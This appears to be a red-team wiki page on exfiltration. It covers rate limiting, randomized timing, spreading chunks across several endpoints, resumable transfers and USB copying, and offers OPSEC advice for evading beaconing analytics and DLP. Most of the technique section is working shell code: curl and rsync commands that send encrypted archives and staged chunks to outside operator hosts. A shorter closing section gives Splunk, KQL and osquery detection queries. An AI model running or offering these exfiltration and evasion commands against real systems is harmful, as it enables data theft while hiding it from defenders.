# Out-of-Band Channels, Throttling & Egress Shaping

*Rate, timing, and volume discipline - the meta-layer that determines whether an otherwise-fine transfer gets caught by behavioral analytics.*

Related: [Exfil principles](01-exfil-principles-and-staging.md) |
[HTTPS & cloud exfil](04-https-and-cloud-exfil.md) |
[C2 malleable profiles & jitter](../c2-infrastructure/02-malleable-profiles-and-jitter.md)

## What & why

The most technically sophisticated exfil operation can be caught by a single NetFlow volume
anomaly or a beaconing-detection rule that fires on regular intervals. The encoding, the
encryption, and the channel choice all matter less than the *shape* of the transfer: how big,
how fast, how regular, and at what time. This page covers the behavioral layer - how to shape
transfers so they do not stand out as anomalies against the environment's own traffic baseline.

The central rule: **regularity and volume are the meta-tells.** Fixed packet intervals, fixed
chunk sizes, and fixed transfer schedules create patterns that statistical analysis catches even
when the content is opaque. Randomize both rate and timing.

## Technique

### Rate limiting and throttling

Cap transfer speed to stay under NetFlow volume thresholds and DLP size triggers. Most DLP
configurations alert on single sessions above 10-50 MB. Match the transfer rate to what the
host normally sends.

```bash
# curl with bandwidth limit (bytes/second)
# 100KB/s = approximately 8.6 MB/minute
curl -s --limit-rate 100k -X POST --data-binary @blob.enc https://203.0.113.10/recv

# pv (pipe viewer) with rate cap
tar -czf - /tmp/collected/ | pv -L 50k | openssl enc -aes-256-cbc -pbkdf2 -pass pass:LAB \
  | curl -s --data-binary @- https://203.0.113.10/recv

# split upload into chunks with per-chunk rate limiting
for chunk in /dev/shm/chunk_*; do
  curl -s --limit-rate 80k -X POST --data-binary @"$chunk" https://203.0.113.10/chunk
done
```

To choose a rate: check the existing outbound traffic baseline. If `ss -i` or `iftop` shows
the host normally pushes 50-200 KB/s in normal operations, stay within that envelope.

### Jitter and randomized timing

Fixed intervals are the fingerprint of automated behavior. Add randomization.

```bash
# random sleep between chunks: 10-60 seconds
for chunk in /dev/shm/chunk_*; do
  curl -s -X POST --data-binary @"$chunk" https://203.0.113.10/chunk
  sleep $(( RANDOM % 50 + 10 ))
done

# random sleep scaled to a larger window: 2-15 minutes between transfers
sleep_rand() {
  sleep $(( RANDOM % 780 + 120 ))  # 120-900 seconds
}

# transfer in pieces over hours
for chunk in /dev/shm/chunk_*; do
  curl -s --limit-rate 60k -X POST --data-binary @"$chunk" https://203.0.113.10/chunk
  sleep_rand
done
```

The jitter percentage that defeats autocorrelation analysis is generally >30% of the sleep
interval. A 60-second sleep with 20-second jitter is not enough; a 60-second sleep with
±40-second jitter is harder to detect.

### Off-hours vs business-hours

This is context-dependent. The correct answer depends on the target environment's baseline.

| Scenario | Recommendation |
|---|---|
| High-traffic business environment (busy proxy, lots of outbound) | Business hours provide cover by volume. Off-hours transfers stand out against a quiet baseline. |
| Low-traffic / server environment | Anytime is conspicuous. Off-hours reduces analyst attention but not anomaly detection. |
| Heavily monitored financial / regulated env | Off-hours may have dedicated anomaly hunting. Business hours only if volumes blend. |
| Unknown environment | Default to business hours, low rate, randomized timing. |

```bash
# check approximate traffic baseline from system (if access permits)
ss -i | grep -E "rtt|cwnd|bytes"
cat /proc/net/dev | awk 'NR>2 {print $1, "tx:", $10, "rx:", $2}'
```

### Chunk-and-spread across multiple destinations

Splitting transfers across multiple operator-controlled endpoints reduces the per-destination
volume signature and makes correlation harder.

```bash
ENDPOINTS=(
  "https://203.0.113.10/a"
  "https://203.0.113.20/b"
  "https://203.0.113.30/c"
)

i=0
for chunk in /dev/shm/chunk_*; do
  ep="${ENDPOINTS[$((i % ${#ENDPOINTS[@]}))]}"
  curl -s --limit-rate 60k -X POST --data-binary @"$chunk" "$ep"
  sleep $(( RANDOM % 30 + 5 ))
  ((i++))
done
```

Each endpoint should be a separate domain/IP with its own certificate to prevent correlation
via shared infrastructure attributes.

### Resumable transfers

Long throttled transfers risk interruption. Use a mechanism that can resume without restarting.

```bash
# rsync over SSH with bandwidth limit (-bwlimit in KB/s)
rsync -az --bwlimit=50 --partial /dev/shm/blob.enc user@203.0.113.10:~/recv/

# curl with resume (requires server to support Range)
curl -C - --limit-rate 50k -o /tmp/out.bin https://203.0.113.10/recv
```

### Out-of-band physical media (USB / removable)

Relevant only in physical red team engagements where the SOW explicitly authorizes physical
access and removable media. Network telemetry does not see USB transfers, but endpoint telemetry
does. Include this only when the engagement scope covers it.

**What USB creates on the host:**

```
Linux:
  - udev rule fires on block device attach: /var/log/syslog / journald
  - auditd can watch /dev/sd* for mount events
  - /var/log/kern.log: "usb X-Y: new USB device"

Windows:
  - Event 4663 (Object Access) on mounted drive letters with audit policy
  - Sysmon Event 6 (Driver Load) for USB storage driver
  - Registry: HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR (device history)
  - SRUM database: app-to-network/USB activity
```

```bash
# Linux: check if USB storage is kernel-module-blocked
lsmod | grep usb_storage          # loaded = USB storage enabled
ls /sys/bus/usb/drivers/usb-storage 2>/dev/null || echo "usb-storage driver absent"

# mount and copy (if in scope)
lsblk -f
mount /dev/sdb1 /mnt/usb
cp /dev/shm/blob.enc /mnt/usb/
sync && umount /mnt/usb
```

## OPSEC notes

- Fixed-rate transfers (no jitter, no sleep) are caught by autocorrelation within minutes by
  modern SIEM beaconing-detection rules. Always add randomness to both size and timing.
- `pv --limit-rate` and `curl --limit-rate` shape the transfer but still produce a single
  continuous connection. A 6-hour continuous TCP session to an external IP is itself anomalous
  on most hosts. Prefer multiple shorter sessions with gaps over one long throttled session.
- The `RANDOM` shell variable in bash is not cryptographically random but is sufficient for
  timing jitter. For more variance, use `$(awk 'BEGIN{srand(); print int(rand()*900)+120}')`.
- USB events are logged at the kernel and often forwarded by host agents even in environments
  that do not log much else. The device serial number is recorded and is persistent across
  plugs - a reused USB device can be correlated across incidents.
- Throttling to a very low rate (e.g. 1 KB/s) over a very long session can itself be
  anomalous (long-lived TCP session with low bytes/time ratio). Match the session duration to
  what is normal for the service you are mimicking.
- Cleanup: remove chunk files and staging files after transfer. Note that `rm` leaves an
  `unlinkat` syscall in auditd. There is no artifact-free cleanup.

## Detection & telemetry

### Volume and timing analytics

| Signal | Source | Detail |
|---|---|---|
| Regular-interval connections | NetFlow, proxy, Zeek conn.log | Autocorrelation / FFT on connection timestamps to same destination |
| Low bytes-per-session with long duration | NetFlow | Throttled long-lived sessions |
| Aggregate daily upload exceeds baseline | NetFlow UEBA | Host uploads 10x more today than its 30-day average |
| Multiple chunks to same destination, evenly spaced | Zeek, proxy | Repeated POSTs at regular intervals regardless of jitter |

**Splunk beaconing detection (simple interval analysis):**

```spl
index=netflow dest_ip=<external>
| eval epoch=strptime(_time, "%s")
| streamstats window=20 current=f global=f avg(epoch) as avg_time by src_ip, dest_ip
| eval delta=abs(epoch - avg_time)
| stats avg(delta) as avg_jitter, count by src_ip, dest_ip
| where avg_jitter < 30 AND count > 10
```

Sessions with `avg_jitter < 30 seconds` and `count > 10` are likely beaconing.

**KQL (Azure Sentinel) - upload volume anomaly:**

```kql
CommonSecurityLog
| where DeviceVendor has "proxy"
| summarize total_out=sum(SentBytes) by SourceIP, DestinationHostName, bin(TimeGenerated, 1h)
| where total_out > 50000000  // 50 MB in one hour
| order by total_out desc
```

### USB / removable media

| Signal | Source | Detail |
|---|---|---|
| New USB storage device | Linux: journald, auditd; Win: Event 4663 / Sysmon 6 | Device serial in log |
| File copy to removable drive | Windows Event 4663, Sysmon EID 11 | Object access on drive letter |
| USB device history | Windows: `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` | Registry: persists after unplug |

**osquery - USB device history (macOS/Linux):**

```sql
SELECT vendor, model, serial, removable
FROM usb_devices
WHERE removable = 1;
```

### Sequence correlation

The most powerful detection is correlating file-collection activity with outbound egress:

```spl
index=edr (EventCode=11 OR action=file_create)
  (file_name="*.tar.gz" OR file_name="*.enc" OR file_name="*.zip")
| eval stage_time=_time
| join host [
    search index=netflow bytes_out > 500000 dest_port=443
    | rename _time as egress_time
  ]
| where egress_time > stage_time AND egress_time < stage_time + 3600
| table host, file_name, stage_time, egress_time, bytes_out
```

## MITRE ATT&CK

- **T1029** - Scheduled Transfer (timing-based exfil)
- **T1030** - Data Transfer Size Limits (chunking under DLP threshold)
- **T1052** - Exfiltration Over Physical Medium
- **T1052.001** - Exfiltration Over Physical Medium: Exfiltration over USB
- **T1048** - Exfiltration Over Alternative Protocol (channel selection)

## References

- MITRE ATT&CK T1029 Scheduled Transfer: https://attack.mitre.org/techniques/T1029/
- MITRE ATT&CK T1030 Data Transfer Size Limits: https://attack.mitre.org/techniques/T1030/
- MITRE ATT&CK T1052 Physical Medium Exfil: https://attack.mitre.org/techniques/T1052/
- NetFlow beaconing detection - SANS whitepaper: https://www.sans.org/reading-room/
- osquery usb_devices table: https://osquery.io/schema/current/#usb_devices
- Splunk Security Essentials beaconing content pack: https://splunkbase.splunk.com/app/3435
